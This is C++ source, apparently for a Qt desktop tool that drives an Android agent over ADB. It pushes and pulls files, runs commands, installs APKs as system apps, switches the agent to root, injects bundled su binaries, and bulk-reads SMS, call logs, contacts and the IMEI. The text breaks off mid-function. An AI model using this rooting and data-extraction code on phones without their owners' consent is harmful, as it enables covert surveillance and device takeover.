#include "fastman2.h"
#include "fastmansocket.h"
#include "adbclient.h"
#include "jdwpwalker.h"
#include "ziphacker.h"
#include <QDateTime>
#include <QFileInfo>
#include <QStringList>
#include <QMutex>
#include <QDir>
#include <QUuid>
#include <zlib.h>
#include "zlog.h"

#define USE_BINARIES_H
#ifdef USE_BINARIES_H
#include "binaries.h"
#endif

#define impact_package "com.dx.impactor"

// from stat.h
#define S_IFMT 00170000
#define S_IFSOCK 0140000
#define S_IFLNK 0120000
#define S_IFREG 0100000
#define S_IFBLK 0060000
#define S_IFDIR 0040000
#define S_IFCHR 0020000
#define S_IFIFO 0010000
#define S_ISUID 0004000
#define S_ISGID 0002000
#define S_ISVTX 0001000

#define S_ISLNK(m) (((m) & S_IFMT) == S_IFLNK)
#define S_ISREG(m) (((m) & S_IFMT) == S_IFREG)
#define S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)
#define S_ISCHR(m) (((m) & S_IFMT) == S_IFCHR)
#define S_ISBLK(m) (((m) & S_IFMT) == S_IFBLK)
#define S_ISFIFO(m) (((m) & S_IFMT) == S_IFIFO)
#define S_ISSOCK(m) (((m) & S_IFMT) == S_IFSOCK)

#define S_IRWXU 00700
#define S_IRUSR 00400
#define S_IWUSR 00200
#define S_IXUSR 00100

#define S_IRWXG 00070
#define S_IRGRP 00040
#define S_IWGRP 00020
#define S_IXGRP 00010

#define S_IRWXO 00007
#define S_IROTH 00004
#define S_IWOTH 00002
#define S_IXOTH 00001

bool ZM_FILE::isLink() {
    return S_ISLNK(st_mode);
}

bool ZM_FILE::isDir() {
    return S_ISDIR(st_mode);
}

bool ZM_FILE::isFile() {
    return !S_ISLNK(st_mode) && S_ISREG(st_mode);
}

int AGENT_APP_INFO::getType() {
    //ApplicationInfo.FLAG_UPDATED_SYSTEM_APP 128
    //ApplicationInfo.FLAG_SYSTEM 1
    //ApplicationInfo.FLAG_EXTERNAL_STORAGE 262144

    if((flags & 128) != 0) {
        return TYPE_UPDATED_SYSTEM_APP;
    } else if((flags & 1) == 0) {
        return TYPE_USER_APP;
    }
    return TYPE_SYSTEM_APP;
}

QString AGENT_APP_INFO::getTypeName() {
    QString ret = QObject::tr("unknown");

    if((flags & 128) != 0) {
        ret = QObject::tr("updated_sys_app");
    } else if((flags & 1) == 0) {
        ret = QObject::tr("user_app");
    } else {
        ret = QObject::tr("sys_app");
    }

    if((flags & 262144) != 0) {
        ret += QObject::tr("[external]");
    }
    return ret;
}

bool AGENT_APP_INFO::isExternal() {
    return (flags & 262144) != 0;
}

FastManAgentClient::FastManAgentClient(const QString &adb_serial, int zm_port) {
    _socket = new FastManSocket(adb_serial, zm_port);
}

FastManAgentClient::~FastManAgentClient() {
    delete _socket;
}

FastManSocket *FastManAgentClient::getSocket() {
    return _socket;
}

bool FastManAgentClient::resetStatus() {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_RESET_STATUS;
    return _socket->sendAndRecvMsg(msg);
}

bool FastManAgentClient::setConnType(unsigned short index, unsigned short type) {
    ZMsg2 msg;
    u16 t = (index << 2) | type;
    msg.cmd = ZMSG2_CMD_SET_CONN_TYPE;
    msg.data.putShort(t);
    return _socket->sendAndRecvMsg(msg);
}

bool FastManAgentClient::addLog(const QString& log) {
    ZMsg2 msg;
    u64 now = QDateTime::currentDateTime().toMSecsSinceEpoch();
    msg.cmd = ZMSG2_CMD_ADD_LOG;
    msg.data.putInt64(now);
    msg.data.putUtf8(log);
    return _socket->sendAndRecvMsg(msg);
}

bool FastManAgentClient::setHint(const QString& hint) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_SET_HINT;
    msg.data.putUtf8(hint);
    return _socket->sendAndRecvMsg(msg);
}

bool FastManAgentClient::setProgress(short value,
                                     short subValue,
                                     short total) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_SET_PROGRESS;
    msg.data.putShort(value);
    msg.data.putShort(subValue);
    msg.data.putShort(total);
    return _socket->sendAndRecvMsg(msg);
}

bool FastManAgentClient::setAlert(unsigned short type) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_SET_ALERT;
    msg.data.putShort(type);
    return _socket->sendAndRecvMsg(msg);
}

bool FastManAgentClient::addInstLog(const QString &name, const QString &id, const QString &md5, const QString &pkg) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_ADD_INSTLOG;
    msg.data.putUtf8(name);
    msg.data.putUtf8(id);
    msg.data.putUtf8(md5);
    msg.data.putUtf8(pkg);
    return _socket->sendAndRecvMsg(msg);
}

bool FastManAgentClient::getTimeGap(qint64 &gap) {
    qint64 deviceTime;
    qint64 clientTime;
    int i = 0;

    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_GET_CURTIME;
    if(!_socket->sendAndRecvMsg(msg)) {
        DBG("fail\n");
        return false;
    }

    deviceTime = msg.data.getNextInt64(i);
    clientTime = QDateTime::currentDateTime().toMSecsSinceEpoch();
    gap = clientTime - deviceTime;
    DBG("time gap = %lld\n", gap);
    return true;
}

bool FastManAgentClient::syncTime() {
    qint64 gap;
    if(!getTimeGap(gap)) {
        return false;
    }

    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_SET_TIMEGAP;
    msg.data.putInt64(gap);
    return _socket->sendAndRecvMsg(msg);
}

bool FastManAgentClient::getBasicInfo(AGENT_BASIC_INFO& info) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_GET_BASICINFO;
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    int i = 0;
    info.brand = msg.data.getNextUtf8(i);
    info.model = msg.data.getNextUtf8(i);
    info.version = msg.data.getNextUtf8(i);
    info.sdk_int = msg.data.getNextInt(i);
    info.imei = msg.data.getNextUtf8(i);
    info.fingerprint = msg.data.getNextUtf8(i);
    return true;
}

int  FastManAgentClient::getInfoCount(quint16 cmd)
{
    ZMsg2 msg;
    msg.ver = ZMSG2_VERSION;
    msg.cmd = cmd;
    msg.data.clear();
    msg.data.putUtf8("Count");
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }
    int i = 0;
    int c = msg.data.getNextInt(i);
    int count = msg.data.getNextInt(i);

    return count;
}

bool FastManAgentClient::getCallInfo(QList<AGENT_CALL_INFO*> &info_list) {
    ZMsg2 msg;
    msg.ver = ZMSG2_VERSION;
    msg.cmd = ZMSG2_CMD_GET_CALLLOG;
    msg.data.clear();
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    while(!info_list.isEmpty()) {
        delete info_list.takeFirst();
    }
    AGENT_CALL_INFO *info = NULL;
    while (_socket->recvMsg(msg) && msg.data.size() > 0) {
        int i = 0;
        info = new AGENT_CALL_INFO;
        info->call_id = msg.data.getNextInt64(i);
        info->name = msg.data.getNextUtf8(i);
        info->phone_num = msg.data.getNextUtf8(i);
        info->date_time = msg.data.getNextInt64(i);
        info->call_type = msg.data.getNextInt(i);
        info->duration_sec = msg.data.getNextInt64(i);

        info_list.append(info);
    }
    return true;
}

bool FastManAgentClient::getSMSInfo(QList<AGENT_SMS_INFO*> &info_list) {
    ZMsg2 msg;
    msg.ver = ZMSG2_VERSION;
    msg.cmd = ZMSG2_CMD_GET_SMSLOG;
    msg.data.clear();
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    while(!info_list.isEmpty()) {
        delete info_list.takeFirst();
    }
    AGENT_SMS_INFO *info = NULL;
    while (_socket->recvMsg(msg) && msg.data.size() > 0) {
        int i = 0;
        info = new AGENT_SMS_INFO;
        info->msg_id = msg.data.getNextInt64(i);
//        info->threadId = msg.data.getNextInt(i);
        info->type = msg.data.getNextInt(i);
        info->address = msg.data.getNextUtf8(i);
        info->date_time = msg.data.getNextInt64(i);
        info->read = msg.data.getNextInt(i);
        info->status = msg.data.getNextInt(i);
        info->subject = msg.data.getNextUtf8(i);
        info->body = msg.data.getNextUtf8(i);
        info->person = msg.data.getNextInt(i);
        info->protocol = msg.data.getNextInt(i);
        info->replyPathPresent = msg.data.getNextInt(i);
        info->serviceCenter = msg.data.getNextUtf8(i);
        info->date_sent = msg.data.getNextInt64(i);
        info->seen = msg.data.getNextInt(i);
        info->locked = msg.data.getNextInt(i);
        info->errorCode = msg.data.getNextInt(i);

        info_list.append(info);
    }
    return true;
}

bool FastManAgentClient::getContactsInfo(QList<AGENT_CONTACTS_INFO*> &info_list) {
    ZMsg2 msg;
    msg.ver = ZMSG2_VERSION;
    msg.cmd = ZMSG2_CMD_GET_CONTACTS;
    msg.data.clear();
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    while(!info_list.isEmpty()) {
        delete info_list.takeFirst();
    }
    AGENT_CONTACTS_INFO *info = NULL;
    while (_socket->recvMsg(msg) && msg.data.size() > 0) {
        int i = 0;
        info = new AGENT_CONTACTS_INFO;
        info->contact_id = msg.data.getNextInt64(i);
        info->name = msg.data.getNextUtf8(i);
        info->phone_num = msg.data.getNextUtf8(i);
        info->num_type = msg.data.getNextUtf8(i);
        info_list.append(info);
    }
    return true;
}

bool FastManAgentClient::getAppList(QList<AGENT_APP_INFO*>& list,
                                    bool loadIcon,
                                    int flag_include,
                                    int flag_exclude, const QString &pkgs) {
    ZMsg2 msg;
    msg.cmd = loadIcon ? ZMSG2_CMD_GET_APPINFO : ZMSG2_CMD_GET_APPINFO_NOICON;
    msg.data.putInt(flag_include);
    msg.data.putInt(flag_exclude);
    msg.data.putUtf8(pkgs);

    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    while (_socket->recvMsg(msg) && msg.data.size() > 0) {
        AGENT_APP_INFO *info = new AGENT_APP_INFO();
        int i = 0;
        int iconLen;
        info->name = msg.data.getNextUtf8(i);
        info->packageName = msg.data.getNextUtf8(i);
        info->versionName = msg.data.getNextUtf8(i);
        info->versionCode = msg.data.getNextInt(i);
        info->sourceDir = msg.data.getNextUtf8(i);
        info->size = msg.data.getNextInt64(i);
        info->mtime = msg.data.getNextInt64(i);
        info->flags = msg.data.getNextInt(i);
        info->enabled = msg.data.getNextByte(i) == 1;
        DBG("got app '%s'\n", info->name.toLocal8Bit().data());
        if (loadIcon) {
            iconLen = msg.data.getNextInt(i);
            DBG("\ticonLen=%d\n", iconLen);
            if(iconLen > 0) {
                info->iconData = msg.data.mid(i);
#ifndef NO_GUI
                info->icon = QImage::fromData(info->iconData);
#endif
            }
        }
        list.append(info);
    }
    DBG("got %d apps\n", list.count());
    return true;
}

bool FastManAgentClient::getAppListHead(bool loadIcon, int flag_include, int flag_exclude, const QString &pkgs) {
    ZMsg2 msg;
    msg.cmd = loadIcon ? ZMSG2_CMD_GET_APPINFO : ZMSG2_CMD_GET_APPINFO_NOICON;
    msg.data.putInt(flag_include);
    msg.data.putInt(flag_exclude);
    msg.data.putUtf8(pkgs);

    return _socket->sendAndRecvMsg(msg);
}

bool FastManAgentClient::getNextApp(AGENT_APP_INFO &info) {
    ZMsg2 msg;
    if(!_socket->recvMsg(msg) || msg.data.size() < 1) {
        return false;
    }

    int i = 0;
    int iconLen;
    info.name = msg.data.getNextUtf8(i);
    info.packageName = msg.data.getNextUtf8(i);
    info.versionName = msg.data.getNextUtf8(i);
    info.versionCode = msg.data.getNextInt(i);
    info.sourceDir = msg.data.getNextUtf8(i);
    info.size = msg.data.getNextInt64(i);
    info.mtime = msg.data.getNextInt64(i);
    info.flags = msg.data.getNextInt(i);
    info.enabled = msg.data.getNextByte(i) == 1;
    DBG("got app '%s'\n", info.name.toLocal8Bit().data());
    if (msg.cmd == ZMSG2_CMD_GET_APPINFO) {
        iconLen = msg.data.getNextInt(i);
        DBG("\ticonLen=%d\n", iconLen);
        if(iconLen > 0) {
            info.iconData = msg.data.mid(i);
#ifndef NO_GUI
            info.icon = QImage::fromData(info.iconData);
#endif
        }
    }
    return true;
}

AGENT_APP_INFO* FastManAgentClient::getAppInfo(const QString &pkg, bool loadIcon) {
    QList<AGENT_APP_INFO*> list;
    AGENT_APP_INFO* ret = NULL;
    if(!getAppList(list, loadIcon, 0, 0, pkg)) {
        return NULL;
    }

    if(list.size() > 0) {
        ret = list.takeFirst();
    }
    while(!list.isEmpty()) {
        delete list.takeFirst();
    }
    return ret;
}

FastManClient::FastManClient(const QString &adb_serial, int zm_port) {
    _socket = new FastManSocket(adb_serial, zm_port);
}

FastManClient::~FastManClient() {
    delete _socket;
}

bool FastManClient::testValid(int timeout) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_GET_FREESPACE;
    msg.data.putUtf8("/");
    if (!_socket->sendAndRecvMsg(msg, timeout)) {
        return false;
    }
    return true;
}

bool FastManClient::switchRootCli() {
    DBG("switchRootCli\n");
    ZMsg2 msg;
    msg.cmd = ZMSG2_SWITCH_ROOT;
    if(_socket->sendAndRecvMsg(msg)) {
        DBG("sendAndRecv success\n");
        ZMINFO info;
        return (getZMInfo(info) && info.euid == 0);
    }
    DBG("sendAndRecv fail\n");
    return false;
}

bool FastManClient::switchQueueCli() {
    DBG("switchQueueCli\n");
    ZMsg2 msg;
    msg.cmd = ZMSG2_SWITCH_QUEUE;
    ZByteArray packet = msg.getPacket();
    if(!_socket->connectToZMaster()) {
        return false;
    }
    _socket->write(packet);
    QByteArray resp = _socket->readx(8);
    return resp == "SWITCHOK";
}

bool FastManClient::execQueue() {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_EXEC_QUEUE;
    return _socket->sendAndRecvMsg(msg);
}

bool FastManClient::cancelQueue() {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_CANCEL_QUEUE;
    return _socket->sendAndRecvMsg(msg);
}

bool FastManClient::getZMInfo(ZMINFO &info) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_GET_ZMINFO;
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    int i = 0;
    info.euid = msg.data.getNextInt(i);
    info.sdk_int = msg.data.getNextInt(i);
    info.cpu_abi = msg.data.getNextInt(i);
    info.sys_free = msg.data.getNextInt64(i);
    info.sys_total = msg.data.getNextInt64(i);
    info.tmp_free = msg.data.getNextInt64(i);
    info.tmp_total = msg.data.getNextInt64(i);
    info.store_free = msg.data.getNextInt64(i);
    info.store_total = msg.data.getNextInt64(i);
    info.tmp_dir = msg.data.getNextUtf8(i);
    info.store_dir = msg.data.getNextUtf8(i);
    info.mem_freeKB = msg.data.getNextInt64(i);
    info.mem_totalKB = msg.data.getNextInt64(i);
    DBG("euid %d, sdk %d, tmp='%s', store='%s'\n", info.euid, info.sdk_int, TR_C(info.tmp_dir), TR_C(info.store_dir));
    DBG("mem_free = %lld KB, mem_total = %lld KB\n", info.mem_freeKB, info.mem_totalKB);
    return true;
}

bool FastManClient::killRemote() {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_QUIT;
    return _socket->sendAndRecvMsg(msg);
}

static uint fast_crc32(const QByteArray& data) {
    uint ret = crc32(0, NULL, 0);
    int size = data.size();
    if(size < 4096) {
        ret = crc32(ret, (const u8*)data.data(), size);
        return ret;
    }

    int parts = size/4096;
    if(parts > 20) {
        parts = 20;
    }

    int blkSize = size/parts;
    int rest = size % blkSize;
    int pos = 0;

    DBG("parts = %d, blkSize = %d, rest = %d\n", parts, blkSize, rest);
    for(int i=0; i<parts; i++) {
        if(i != parts - 1) {
            ret = crc32(ret, (const u8*)(data.data() + pos), 4096);
            pos += blkSize;
        } else {
            pos += blkSize;
            pos += rest;
            pos -= 4096;
        }
    }

    ret = crc32(ret, (const u8*)(data.data() + pos), 4096);

    DBG("ret = %u\n", ret);
    return ret;
}

static bool fast_crc32(const QString& path, qint64& size, uint& ret) {
    ret = crc32(0, NULL, 0);
    char buf[4096];
    int n = -1;

    QFile file(path);
    if(!file.open(QIODevice::ReadOnly)) {
        DBG("file open failed!\n");
        return false;
    }

    size = file.size();
    if(size < sizeof(buf)) {
        n = file.read(buf, sizeof(buf));
        ret = crc32(ret, (const u8*)buf, n);
        file.close();
        return true;
    }

    qint64 parts = size/sizeof(buf);
    if(parts > 20) {
        parts = 20;
    }

    qint64 blkSize = size/parts;
    qint64 rest = size % blkSize;
    qint64 pos = 0;

    DBG("parts = %lld, blkSize = %lld, rest = %lld\n", parts, blkSize, rest);
    for(qint64 i=0; i<parts; i++) {
        if(i != parts - 1) {
            n = file.read(buf, sizeof(buf));
            ret = crc32(ret, (const u8*)buf, n);
            pos += blkSize;
        } else {
            pos += blkSize;
            pos += rest;
            pos -= sizeof(buf);
        }
        file.seek(pos);
    }

    n = file.read(buf, sizeof(buf));
    ret = crc32(ret, (const u8*)buf, n);

    DBG("ret = %u\n", ret);
    file.close();
    return true;
}

// req [head]"size:path:uid:gid:mode:mtime:crc32"
// resp [head]"code:message"
// req <file content>
bool FastManClient::push(const QString &lpath, const QString &rpath, int mode, int uid, int gid, uint mtime) {
    ZMsg2 msg;
    uint crc;
    qint64 size;
    if (!fast_crc32(lpath, size, crc)) {
        DBG("push fail! local file <%s> not exists!\n", lpath.toLocal8Bit().data());
        return false;
    }

    QFile file(lpath);
    if (file.open(QIODevice::ReadOnly)) {
        msg.cmd = ZMSG2_CMD_PUSH;
        msg.data.putInt64(size);
        msg.data.putUtf8(rpath);
        msg.data.putInt(uid);
        msg.data.putInt(gid);
        msg.data.putInt(mode);
        msg.data.putInt(mtime);
        msg.data.putInt(crc);
        if (!_socket->sendAndRecvMsg(msg)) {
            file.close();
            return false;
        }

        int i = 0;
        int code = msg.data.getNextInt(i);
        QString resp = msg.data.getNextUtf8(i);
        DBG("code:%d, msg:'%s'\n", code, TR_C(resp));
        if (code == 255) {
            file.close();
            return true;
        }

        if (code == 0) {
            char buf[8192];
            int n = 0;

            while ((n = file.read(buf, sizeof(buf))) > 0) {
                if (_socket->write(buf, n) <= 0) {
                    code = -1;
                    break;
                }
                _socket->waitForBytesWritten();
            }

            _socket->waitForReadyRead(5000);
            if (_socket->recvMsg(msg)) {
                i = 0;
                code = msg.data.getNextInt(i);
                resp = msg.data.getNextUtf8(i);
                DBG("final code:%d, msg:'%s'\n", code, TR_C(resp));
            }
        }
        file.close();
        return code == 0;
    } else {
        DBG("local file cannot be opened!\n");
    }
    return false;
}

bool FastManClient::pushData(const QByteArray &data, const QString &rpath, int mode, int uid, int gid, uint mtime) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_PUSH;
    msg.data.putInt64(data.size());
    msg.data.putUtf8(rpath);
    msg.data.putInt(uid);
    msg.data.putInt(gid);
    msg.data.putInt(mode);
    msg.data.putInt(mtime);
    msg.data.putInt(fast_crc32(data));
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    int i = 0;
    int code = msg.data.getNextInt(i);
    QString resp = msg.data.getNextUtf8(i);
    DBG("code:%d, msg:'%s'\n", code, TR_C(resp));
    if (code == 255) {
        return true;
    }

    if (code == 0) {
        int pos = 0;
        int left = data.size();
        int n = 0;

        while (left > 0) {
            n = _socket->write(data.data() + pos, left > 8192 ? 8192 : left);
            if (n <= 0) {
                break;
            }
            _socket->waitForBytesWritten();
            pos += n;
            left -= n;
        }

        _socket->waitForReadyRead(5000);
        if (_socket->recvMsg(msg)) {
            i = 0;
            code = msg.data.getNextInt(i);
            resp = msg.data.getNextUtf8(i);
            DBG("final code:%d, msg:'%s'\n", code, TR_C(resp));
        }
    }
    return code == 0;
}

// req [head]"path"
// resp [head]"code/size:message"
// resp [var file content]
bool FastManClient::pull(const QString &lpath, const QString &rpath) {
    ZMsg2 msg;
    QFile file(lpath);

    msg.cmd = ZMSG2_CMD_PULL;
    msg.data.putUtf8(rpath);
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    int i = 0;
    int left = msg.data.getNextInt(i);
    QString resp = msg.data.getNextUtf8(i);
    DBG("code:%d, msg:'%s'\n", left, TR_C(resp));

    if (left > 0 && file.open(QIODevice::WriteOnly)) {
        char buf[8192];
        int n = 0;
        while (left > 0) {
            _socket->waitForReadyRead(200);
            n = _socket->read(buf, left > 8192 ? 8192 : left);
            if (n <= 0) {
                break;
            }
            file.write(buf, n);
            left -= n;
            _socket->waitForReadyRead(200);
        }
        file.flush();
        file.close();

        if (_socket->recvMsg(msg)) {
            i = 0;
            left = msg.data.getNextInt(i);
            resp = msg.data.getNextUtf8(i);
            DBG("final code:%d, msg:'%s'\n", left, TR_C(resp));
        }
        return true;
    }
    return false;
}

bool FastManClient::pullData(QByteArray &out, const QString &rpath) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_PULL;
    msg.data.putUtf8(rpath);
    out.clear();
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    int i = 0;
    int left = msg.data.getNextInt(i);
    QString resp = msg.data.getNextUtf8(i);
    DBG("code:%d, msg:'%s'\n", left, TR_C(resp));

    if (left > 0) {
        char buf[8192];
        int n = 0;
        while (left > 0) {
            _socket->waitForReadyRead(200);
            n = _socket->read(buf, left > 8192 ? 8192 : left);
            if (n <= 0) {
                break;
            }
            out.append(buf, n);
            left -= n;
            _socket->waitForReadyRead(200);
        }

        if (_socket->recvMsg(msg)) {
            i = 0;
            left = msg.data.getNextInt(i);
            resp = msg.data.getNextUtf8(i);
            DBG("final code:%d, msg:'%s'\n", left, TR_C(resp));
        }
        return true;
    }
    return false;
}

// req [head][argc][argv]...
// resp [head][ret][data_len][var data]
int FastManClient::exec(QByteArray &result, int count, ...) {
    ZMsg2 msg;
    int i = 0;
    result.clear();

    msg.cmd = ZMSG2_CMD_EXEC;
    msg.data.putInt(count);

    va_list args;
    va_start(args, count);
    for(i=0; i<count; i++) {
        char *arg = va_arg(args, char *);
        msg.data.putUtf8(QString::fromUtf8(arg));
    }
    va_end(args);

    if (!_socket->sendAndRecvMsg(msg, -1)) {
        return -1;
    }

    i = 0;
    int ret = msg.data.getNextInt(i);
    int left = msg.data.getNextInt(i);
    DBG("ret=%d, len=%d\n", ret, left);
    DBG_HEX(msg.data.data(), msg.data.size());
    result.append(msg.data.data() + i, msg.data.length() - i);
    return ret;
}

// req [head]"path"[bool delSelf]
// resp [head]
bool FastManClient::remove(const QString &path, bool delSelf) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_RM;
    msg.data.putUtf8(path);
    msg.data.putByte(delSelf ? 1 : 0);
    if (!_socket->sendAndRecvMsg(msg, -1)) {
        return false;
    }

    return true;
}

// req [head]"path"
// resp [head][u64]
u64 FastManClient::getFreeSpace(const QString& path) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_GET_FREESPACE;
    msg.data.putUtf8(path);
    if (!_socket->sendAndRecvMsg(msg)) {
        return 0;
    }

    int i = 0;
    u64 ret = msg.data.getNextInt64(i);
    DBG("getFreeSpace %lld\n", ret);
    return ret;
}

// req [head][count][str]...
// resp [head][str]...
bool FastManClient::getProps(const QStringList &keys, QStringList &values) {
    ZMsg2 msg;
    int count = keys.size();

    msg.cmd = ZMSG2_CMD_GET_PROPS;
    msg.data.putInt(count);
    foreach(const QString& key, keys) {
        msg.data.putUtf8(key);
    }
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    int i = 0;
    while (count-- > 0) {
        values.append(msg.data.getNextUtf8(i));
    }
    return true;
}

// req [head]"path"
// resp [head]"code:message/size"
bool FastManClient::getFileSize(const QString &path, quint64 &size) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_GET_FILESIZE;
    msg.data.putUtf8(path);
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    int i = 0;
    int ret = msg.data.getNextInt(i);
    if(ret == 0) {
        size = msg.data.getNextInt64(i);
        return true;
    } else {
        QString resp = msg.data.getNextUtf8(i);
        DBG("code:%d, msg:'%s'\n", ret, resp.toLocal8Bit().data());
    }
    return false;
}

// req [head]"path"[maxdepth]
// resp [head]"path"[size][mode][mtime]
// resp ...
// resp [head] // ends
bool FastManClient::getFileList(const QString &path, int maxdepth, QList<ZM_FILE *> &list, const QStringList &blackList) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_GET_FILELIST;
    msg.data.putUtf8(path);
    msg.data.putInt(maxdepth);
    msg.data.putInt(blackList.size());
    foreach(const QString& name, blackList) {
        msg.data.putUtf8(name);
    }

    if(!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    while(_socket->recvMsg(msg) && msg.data.size() > 0) {
        ZM_FILE *info = new ZM_FILE();
        int i = 0;
        info->path = msg.data.getNextUtf8(i);
        info->st_size = msg.data.getNextInt(i);
        info->st_mode = msg.data.getNextInt(i);
        info->st_mtime = msg.data.getNextInt(i);
        if(info->isLink()) {
            info->link_path = msg.data.getNextUtf8(i);
        }
        //DBG("got file '%s'\n", qPrintable(info->path));
        list.append(info);
    }
    DBG("got %d files\n", list.count());
    return true;
}

bool FastManClient::getSDCardList(QList<ZM_SDCARD *> &list) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_GET_SDCARDLIST;
    if(!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    while(_socket->recvMsg(msg) && msg.data.size() > 0) {
        ZM_SDCARD *info = new ZM_SDCARD();
        int i = 0;
        info->sd_path = msg.data.getNextUtf8(i);
        info->sd_free = msg.data.getNextInt64(i);
        DBG("got [%s] free [%lld]\n", qPrintable(info->sd_path), info->sd_free);
        list.append(info);
    }
    return true;
}

// req [head]"path"
// resp [head]"code:message/md5"
bool FastManClient::getFileMd5(const QString &path, QString &md5) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_GET_FILEMD5;
    msg.data.putUtf8(path);
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    int i = 0;
    int ret = msg.data.getNextInt(i);
    md5 = msg.data.getNextUtf8(i);
    DBG("code:%d, msg:'%s'\n", ret, md5.toLocal8Bit().data());
    return ret == 0;
}

// req [head][minXmlSize]
// resp [head][path1][md51][path2][md52]
bool FastManClient::getApkSample(APK_SAMPLE_INFO &info, int minXmlSize) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_GET_APKSAMPLE;
    msg.data.putInt(minXmlSize);
    if (!_socket->sendAndRecvMsg(msg, -1)) {
        return false;
    }

    int i = 0;
    info.path1 = msg.data.getNextUtf8(i);
    info.md5_1 = msg.data.getNextUtf8(i);
    info.path2 = msg.data.getNextUtf8(i);
    info.md5_2 = msg.data.getNextUtf8(i);
    return true;
}

// req [head][rpath][N][str1]...[strN]
// resp [head][b]
bool FastManClient::searchApkStr(const QString &rpath, const QStringList &keys) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_SEARCH_APKSTR;
    msg.data.putUtf8(rpath);
    msg.data.putInt(keys.size());
    foreach(const QString& str, keys) {
        msg.data.putUtf8(str);
    }
    if(!_socket->sendAndRecvMsg(msg, -1)) {
        return false;
    }

    int i = 0;
    bool ret = msg.data.getNextByte(i) == 1;
    return ret;
}

bool FastManClient::setAlertType(const unsigned short type) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_SET_ALERT_TYPE;
    msg.data.putShort(type);
    return _socket->sendAndRecvMsg(msg);
}

bool FastManClient::installApk(const QString &lpath,
                               const QString &rpath,
                               const QString& pkg,
                               const QString& name,
                               u8 location,
                               u8 sys) {
    return push(lpath, rpath) && installApk(rpath, pkg, name, location, sys);
}

// req [head]rpath,pkg,name,loc,sys
// resp [head]code,msg
bool FastManClient::installApk(const QString &rpath,
                               const QString& pkg,
                               const QString& name,
                               u8 location,
                               u8 sys) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_INSTALL_APK;
    msg.data.putUtf8(rpath);
    msg.data.putUtf8(pkg);
    msg.data.putUtf8(name);
    msg.data.putByte(location);
    msg.data.putByte(sys);
    if (!_socket->sendAndRecvMsg(msg, -1)) {
        return false;
    }

    int i = 0;
    int ret = msg.data.getNextInt(i);
    QString resp = msg.data.getNextUtf8(i);
    DBG("code:%d, msg:'%s'\n", ret, resp.toLocal8Bit().data());
    return ret == 0;
}

bool FastManClient::installApkSys(const QString &lpath,
                                  const QString &rpath) {
    return push(lpath, rpath) && installApkSys(rpath);
}

// req [head]path
// resp [head]code,msg
bool FastManClient::installApkSys(const QString &rpath) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_INST_APK_SYS;
    msg.data.putUtf8(rpath);
    if(!_socket->sendAndRecvMsg(msg, -1)) {
        return false;
    }

    int i = 0;
    int ret = msg.data.getNextInt(i);
    QString resp = msg.data.getNextUtf8(i);
    DBG("code:%d, msg:'%s'\n", ret, resp.toLocal8Bit().data());
    return ret == 0;
}

// req [head][b]
// resp [head][code][msg]
bool FastManClient::invokeProtect(bool enable) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_INVOKE_PROTECT;
    msg.data.putByte(enable ? 1 : 0);
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }
    int i = 0;
    int ret = msg.data.getNextInt(i);
    QString resp = msg.data.getNextUtf8(i);
    DBG("code:%d, msg:'%s'\n", ret, resp.toLocal8Bit().data());
    return ret == 0;
}

// req [head](su_size)(su_bin)
// resp [head][code][msg]
bool FastManClient::invokeSu(const ZMINFO &info, bool add) {
    ZMsg2 msg;
    msg.cmd = ZMSG2_CMD_INVOKE_SU;
    if(!add) {
        msg.data.putInt(0);
    } else {
        unsigned char *su_data = NULL;
        int su_size = 0;
        if(info.cpu_abi == ZMINFO::CPU_ABI_ARM) {
            su_data = bin_su;
            su_size = sizeof(bin_su);
            if(info.sdk_int >= 20) {
                su_data = bin_su_pie;
                su_size = sizeof(bin_su_pie);
            }
        } else if(info.cpu_abi == ZMINFO::CPU_ABI_MIPS) {
            su_data = bin_su_mips;
            su_size = sizeof(bin_su_mips);
        } else if(info.cpu_abi == ZMINFO::CPU_ABI_X86) {
            su_data = bin_su_x86;
            su_size = sizeof(bin_su_x86);
        }

        if(su_data == NULL) {
